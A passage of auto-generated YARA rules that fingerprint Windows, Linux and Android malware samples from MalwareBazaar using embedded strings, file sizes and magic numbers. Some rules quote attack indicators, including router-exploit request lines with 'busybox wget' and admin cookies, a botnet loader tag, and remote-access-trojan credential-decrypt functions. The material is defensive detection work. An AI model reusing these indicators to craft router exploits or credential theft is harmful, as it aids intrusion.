        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "ios_base::eofbit set"
        $s6 = "ios_base::failbit set"
        $s7 = "ios_base::badbit set"
        $s8 = "GAIsProcessorFeaturePresent"
        $s9 = "KERNEL32"
        $s10 = "FlsSetValue"
        $s11 = "FlsGetValue"
        $s12 = "CorExitProcess"
        $s13 = "An application has made an attempt to load the C runtime library incorrectly."
        $s14 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s15 = "- Attempt to initialize the CRT more than once."
        $s16 = "- unable to open console device"
        $s17 = "- unexpected multithread lock error"
        $s18 = "- not enough space for thread data"
        $s19 = "- floating point support not loaded"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 348KB and
        all of them
}

rule Windows_fba819d2e345ae62fe34712d79c24497380d5709433ac30573ad30318d6f2857
{
    meta:
        description = "Auto ML: fba819d2e345ae62fe34712d79c24497380d5709433ac30573ad30318d6f2857"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6852KB and
        all of them
}

rule Windows_fbcd47d1ae7422b87d525af8fb27fef6bf0946137d6e635e4be4adfd6a150f7e
{
    meta:
        description = "Auto ML: fbcd47d1ae7422b87d525af8fb27fef6bf0946137d6e635e4be4adfd6a150f7e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "gSystem.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPR"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Point"
        $s8 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD]"
        $s9 = "System.Drawing.Bitmap"
        $s10 = "iWIN"
        $s11 = "NyqOr.exe"
        $s12 = "System.Runtime.CompilerServices"
        $s13 = "<Module>"
        $s14 = "kernel32.dll"
        $s15 = "System"
        $s16 = "Module"
        $s17 = "System.Reflection"
        $s18 = "System.IO"
        $s19 = "WindowsFormsControlLibrary1"
        $s20 = "System.Windows.Forms"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 793KB and
        all of them
}

rule Windows_fc033161f27b2a779ed33cd69173d269b141414ad57ea833fbe2e02f2503540d
{
    meta:
        description = "Auto ML: fc033161f27b2a779ed33cd69173d269b141414ad57ea833fbe2e02f2503540d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 781KB and
        all of them
}

rule Windows_fc093b245007538a7359e050fda837ea9f19ddb9d53e310f9bcdfd2bc55b4f19
{
    meta:
        description = "Auto ML: fc093b245007538a7359e050fda837ea9f19ddb9d53e310f9bcdfd2bc55b4f19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "z3SWiN:INnK"
        $s5 = "JSet"
        $s6 = "<BindCreateInstance>b__10"
        $s7 = "<SaveTransmissionToFileAsync>d__10"
        $s8 = "<DoWriteRawValueAsync>d__120"
        $s9 = "<InternalWriteStartAsync>d__20"
        $s10 = "<GetEnumerator>d__20"
        $s11 = "<GetFilteredFiles>d__20"
        $s12 = "<WaitForReady>d__20"
        $s13 = "<WriteTokenAsync>d__30"
        $s14 = "<DoReadAsBooleanAsync>d__40"
        $s15 = "AWac5IgEtShXR0"
        $s16 = "<ReadFlightsOnce>b__20_0"
        $s17 = "<GetMergedCustomAndManifestActionsInOrder>b__20_0"
        $s18 = "<GetFieldsAndProperties>b__30_0"
        $s19 = "<GetFiles>b__30_0"
        $s20 = "<GetChildPrivateFields>b__40_0"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8097KB and
        all of them
}

rule Linux_fc668dc146e141d61b717d3ef9fae57758d6a5f3331fe6266a255901e8912d29
{
    meta:
        description = "Auto ML: fc668dc146e141d61b717d3ef9fae57758d6a5f3331fe6266a255901e8912d29"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "GETv"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "http"
        $s5 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s6 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Linux_1831f544f4cc18b34e2f7ae6a02f4037239d40cc976728f4002865a5a319554e
{
    meta:
        description = "Auto ML: 1831f544f4cc18b34e2f7ae6a02f4037239d40cc976728f4002865a5a319554e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB and
        all of them
}

rule Windows_fc6db6c30bc8cd0320881e6d28dc66369b6498b158a000e741e8ce5133a880f1
{
    meta:
        description = "Auto ML: fc6db6c30bc8cd0320881e6d28dc66369b6498b158a000e741e8ce5133a880f1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB and
        all of them
}

rule Windows_fcaff63b58fa89a2682cf2f21485df3cd0e37a424aa947fd05106a00b1e8f95f
{
    meta:
        description = "Auto ML: fcaff63b58fa89a2682cf2f21485df3cd0e37a424aa947fd05106a00b1e8f95f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_Panel1"
        $s5 = "get_Panel2"
        $s6 = "<Module>"
        $s7 = "get_GUID"
        $s8 = "set_GUID"
        $s9 = "get_ASCII"
        $s10 = "get_kHhJ"
        $s11 = "System.IO"
        $s12 = "System.Data"
        $s13 = "SetupRecordingsData"
        $s14 = "SetupEventsData"
        $s15 = "System.Collections.Generic"
        $s16 = "Read"
        $s17 = "Thread"
        $s18 = "Load"
        $s19 = "fileSystemWatcher1_Changed"
        $s20 = "chkBoxProcessSchedule_CheckedChanged"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 691KB and
        all of them
}

rule Windows_fcf48a9792abfda9d9c9d32c6e7348e4cf3fed606c4aea8acf4e2ba4fdf08caf
{
    meta:
        description = "Auto ML: fcf48a9792abfda9d9c9d32c6e7348e4cf3fed606c4aea8acf4e2ba4fdf08caf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<DeleteDirectory>b__0"
        $s5 = "<DeleteDirectory>b__1"
        $s6 = "read32"
        $s7 = "read16"
        $s8 = "read8"
        $s9 = "<Module>"
        $s10 = "MSP_SET_MISC"
        $s11 = "HEADER_CMD"
        $s12 = "MSP_EEPROM_WRITE"
        $s13 = "MSP_RESET_CONF"
        $s14 = "MSP_SET_RC_TUNING"
        $s15 = "get_ASCII"
        $s16 = "System.IO"
        $s17 = "System.Windows.Media"
        $s18 = "FileData"
        $s19 = "fileData"
        $s20 = "get_KeyData"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 661KB and
        all of them
}

rule Windows_fd032e026a2d0dc8f80370acf62e120c4a04fb1fd46318839f162f1949ad0edf
{
    meta:
        description = "Auto ML: fd032e026a2d0dc8f80370acf62e120c4a04fb1fd46318839f162f1949ad0edf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "DbSet`1"
        $s5 = "HashSet`1"
        $s6 = "QLChiTieuDataSet1"
        $s7 = "qLChiTieuDataSet1"
        $s8 = "<Module>"
        $s9 = "get_IdGD"
        $s10 = "set_IdGD"
        $s11 = "get_LoaiGD"
        $s12 = "set_LoaiGD"
        $s13 = "get_IdLoaiGD"
        $s14 = "set_IdLoaiGD"
        $s15 = "get_NgayGD"
        $s16 = "set_NgayGD"
        $s17 = "System.IO"
        $s18 = "get_MoTa"
        $s19 = "set_MoTa"
        $s20 = "System.Xml.Schema"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 867KB and
        all of them
}

rule Windows_fd203c3b8a0edc3629e43bb063fcc0ec3b87cc7d9827a87c892c6fdf45a89d0c
{
    meta:
        description = "Auto ML: fd203c3b8a0edc3629e43bb063fcc0ec3b87cc7d9827a87c892c6fdf45a89d0c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System"
        $s7 = "Microsoft.VisualBasic.CompilerServices"
        $s8 = "StandardModuleAttribute"
        $s9 = "System.IO"
        $s10 = "FileInfo"
        $s11 = "FileStream"
        $s12 = "System.Net.Sockets"
        $s13 = "System.Reflection"
        $s14 = "GetEntryAssembly"
        $s15 = "get_Location"
        $s16 = "RegistryProxy"
        $s17 = "get_Registry"
        $s18 = "Microsoft.Win32"
        $s19 = "RegistryKey"
        $s20 = "get_CurrentUser"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 24KB and
        all of them
}

rule Windows_fd26e32b1bf02dc23d6f3b1f918e3509a139d02626aac37515196b9befdf13dd
{
    meta:
        description = "Auto ML: fd26e32b1bf02dc23d6f3b1f918e3509a139d02626aac37515196b9befdf13dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "SHELL32.dll"
        $s7 = "USER32.dll"
        $s8 = "getaddrinfo"
        $s9 = "ntdll.dll"
        $s10 = "cmDGV\" B"
        $s11 = "SetupDiEnumDeviceInterfaces"
        $s12 = "LoadLibraryA"
        $s13 = "CRYPT32.dll"
        $s14 = "GetModuleHandleA"
        $s15 = "gdiplus.dll"
        $s16 = "GetSystemMetrics"
        $s17 = "GetProcAddress"
        $s18 = "ExitProcess"
        $s19 = "ShellExecuteA"
        $s20 = "GetVersionExA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3105KB and
        all of them
}

rule Linux_fd4572be80cb7c0389c16c0336ec62665288ebc8d8c6707c0bb39119eb722b99
{
    meta:
        description = "Auto ML: fd4572be80cb7c0389c16c0336ec62665288ebc8d8c6707c0bb39119eb722b99"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB and
        all of them
}

rule Windows_fd49ef5bc25a401c934ff5b3c276741b41933e62e2e1fd3223e4ab8986ec60ca
{
    meta:
        description = "Auto ML: fd49ef5bc25a401c934ff5b3c276741b41933e62e2e1fd3223e4ab8986ec60ca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "History.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{770F3D34-BB62-4CFC-8F99-80700D713179}"
        $s15 = "<Module>{70c6a501-4533-4458-994b-710f71567388}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.Threading.Tasks"
        $s19 = "Module"
        $s20 = "System.Security.Cryptography"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 227KB and
        all of them
}

rule Windows_fd4dd04fc93e026a69f642e85d2b9d56ccc144994d35496d0090bde17d13d2b9
{
    meta:
        description = "Auto ML: fd4dd04fc93e026a69f642e85d2b9d56ccc144994d35496d0090bde17d13d2b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = ".rsrc"
        $s6 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s7 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADZ"
        $s8 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s9 = "System.Drawing.Bitmap"
        $s10 = "<Module>"
        $s11 = "WindowsApplication1.My"
        $s12 = "ThreadSafeObjectProvider`1"
        $s13 = "WindowsApplication1"
        $s14 = "WindowsApplication1.My.Resources"
        $s15 = "MySettings"
        $s16 = "MySettingsProperty"
        $s17 = "WindowsFormsApplicationBase"
        $s18 = "System.Collections.Generic"
        $s19 = "System"
        $s20 = "OnCreateMainForm"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 25540KB and
        all of them
}

rule Windows_fd68ed7ff3adfd19b32efde83d13edb583c7d756d0780d079efac6d09ff8bbb4
{
    meta:
        description = "Auto ML: fd68ed7ff3adfd19b32efde83d13edb583c7d756d0780d079efac6d09ff8bbb4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 289KB and
        all of them
}

rule Windows_183c71d2749893b3018f8d521712a58c6b3efd449a5ecbbbb12df1da69e0f7f6
{
    meta:
        description = "Auto ML: 183c71d2749893b3018f8d521712a58c6b3efd449a5ecbbbb12df1da69e0f7f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_Panel1"
        $s5 = "get_Panel2"
        $s6 = "<Module>"
        $s7 = "get_TEAM_A"
        $s8 = "System.IO"
        $s9 = "get_Fecha"
        $s10 = "set_Fecha"
        $s11 = "set_UseMnemonic"
        $s12 = "System.Collections.Generic"
        $s13 = "get_Enabled"
        $s14 = "set_Enabled"
        $s15 = "set_FormattingEnabled"
        $s16 = "set_Sorted"
        $s17 = "get_BirthdateFormatted"
        $s18 = "set_BirthdateFormatted"
        $s19 = "get_FlatAppearance"
        $s20 = "set_SplitterDistance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 778KB and
        all of them
}

rule Windows_fd79a1b3b18fca2696c2c58f290a4dadb97e3cdcd6e98d14a63ac3f4a1f2e351
{
    meta:
        description = "Auto ML: fd79a1b3b18fca2696c2c58f290a4dadb97e3cdcd6e98d14a63ac3f4a1f2e351"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 289KB and
        all of them
}

rule Windows_fe3b2cf08a6224a04194a6555b4593b0a7428cb1fe057c08776d09568fc58cd5
{
    meta:
        description = "Auto ML: fe3b2cf08a6224a04194a6555b4593b0a7428cb1fe057c08776d09568fc58cd5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".text"
        $s3 = "KERNEL32.DLL"
        $s4 = "ADVAPI32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "USER32.dll"
        $s7 = "LoadLibraryA"
        $s8 = "GetProcAddress"
        $s9 = "ExitProcess"
        $s10 = "RegCloseKey"
        $s11 = "memset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 45KB and
        all of them
}

rule Linux_fe3c5abccf0e174e726df22fb3a3a751e44532638bffdaa89599b802b5a3d08d
{
    meta:
        description = "Auto ML: fe3c5abccf0e174e726df22fb3a3a751e44532638bffdaa89599b802b5a3d08d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB and
        all of them
}

rule Android_fe57a9650a15a4b4201c4d896f662862a4679e142acdec8889218e5382299e4e
{
    meta:
        description = "Auto ML: fe57a9650a15a4b4201c4d896f662862a4679e142acdec8889218e5382299e4e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/dexopt/baseline.prof"
        $s2 = "assets/dexopt/baseline.profm"
        $s3 = "scmD"
        $s4 = "gETY"
        $s5 = "TWIN"
        $s6 = "qGEt"
        $s7 = "sget_"
        $s8 = "xwin"
        $s9 = "Cmdg"
        $s10 = "`setb"
        $s11 = "res/color/mtrl_chip_close_icon_tint.xml"
        $s12 = "XICC_PROFILE"
        $s13 = "IEC http://www.iec.ch"
        $s14 = ",Reference Viewing Condition in IEC61966-2.1"
        $s15 = "YWin"
        $s16 = "''res/color/mtrl_chip_close_icon_tint.xml"
        $s17 = ">>*Tips: If you already have an account, you can log in directly"
        $s18 = "ll*Video uploading and publishing specifications, read the specifications first, and then answer the questions"
        $s19 = "3. The title is also very important. An attractive title is the direct result of the user"
        $s20 = "4. Ensuring the quality of video content is the key to user payment, ensuring video content"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 16723KB and
        all of them
}

rule Windows_fe5ae51a975c574691bb439e36d0a25c2ae64888fa2bd83d179a43b86e5dc2e8
{
    meta:
        description = "Auto ML: fe5ae51a975c574691bb439e36d0a25c2ae64888fa2bd83d179a43b86e5dc2e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CTempWnd"
        $s6 = "GetMonitorInfoA"
        $s7 = "MonitorFromWindow"
        $s8 = "GetSystemMetrics"
        $s9 = "USER32"
        $s10 = "COMCTL32.DLL"
        $s11 = "CCmdTarget"
        $s12 = "CTempGdiObject"
        $s13 = "CTempDC"
        $s14 = "CWindowDC"
        $s15 = "CUserException"
        $s16 = "CWinApp"
        $s17 = "Settings"
        $s18 = "CWinThread"
        $s19 = "MS Shell Dlg"
        $s20 = "CTempMenu"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 572KB and
        all of them
}

rule Windows_fe7bc8e4d21896c46905bf10e1f891c6f7d4c731ba3097ae2f369a5959911a1c
{
    meta:
        description = "Auto ML: fe7bc8e4d21896c46905bf10e1f891c6f7d4c731ba3097ae2f369a5959911a1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4593KB and
        all of them
}

rule Windows_fede9398271e52b8a3542cef51cccf5e8a6944110eaa2f060d8fdd1f65682035
{
    meta:
        description = "Auto ML: fede9398271e52b8a3542cef51cccf5e8a6944110eaa2f060d8fdd1f65682035"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "ShellExecuteExW"
        $s7 = "GetModuleFileNameW"
        $s8 = "SetClipboardData"
        $s9 = "SHELL32.dll"
        $s10 = "LoadLibraryA"
        $s11 = "GetProcAddress"
        $s12 = "USER32.dll"
        $s13 = "GetModuleHandleA"
        $s14 = "GetLastError"
        $s15 = "GetProcessWindowStation"
        $s16 = "WTSAPI32.dll"
        $s17 = "yGET"
        $s18 = "KERNEL32.dll"
        $s19 = "SetProcessAffinityMask"
        $s20 = "GetProcessAffinityMask"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6504KB and
        all of them
}

rule Linux_fef00a4beb5d5594dc1df7877e14e58b81f5e81c8f56eb099e06224c6d960589
{
    meta:
        description = "Auto ML: fef00a4beb5d5594dc1df7877e14e58b81f5e81c8f56eb099e06224c6d960589"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB and
        all of them
}

rule Windows_fef57f4508867803dde9b9d9729ad78fc679c607147c69ca809c2ae262472e8d
{
    meta:
        description = "Auto ML: fef57f4508867803dde9b9d9729ad78fc679c607147c69ca809c2ae262472e8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "gdiplus.dll"
        $s7 = "GdiPlus.dll"
        $s8 = "user32.dll"
        $s9 = "kernel32.dll"
        $s10 = "Kernel32.dll"
        $s11 = "User32.dll"
        $s12 = "msimg32.dll"
        $s13 = "user32"
        $s14 = "Gdiplus.dll"
        $s15 = "UxTheme.dll"
        $s16 = "GdipCreateFontFamilyFromName"
        $s17 = "GdipDeleteFontFamily"
        $s18 = "GdipCreateFont"
        $s19 = "SystemParametersInfoA"
        $s20 = "GdipDeleteFont"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2268KB and
        all of them
}

rule Linux_fefed8e65f6981389e86fc8f521b653b495fdd79a41058f481d929d8208d8d3e
{
    meta:
        description = "Auto ML: fefed8e65f6981389e86fc8f521b653b495fdd79a41058f481d929d8208d8d3e"
